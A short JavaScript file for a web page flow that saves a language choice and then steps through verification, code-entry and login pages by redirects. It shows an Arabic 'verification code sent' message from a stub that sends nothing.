function chooseLang(lang) {
  localStorage.setItem("lang", lang);
  window.location.href = "verify.html";
}

function sendCode() {
  document.getElementById("msg").innerText =
    "✅ تم إرسال رمز التحقق بنجاح";
  setTimeout(() => {
    window.location.href = "code.html";
  }, 1500);
}

function confirmCode() {
  window.location.href = "login.html";
}
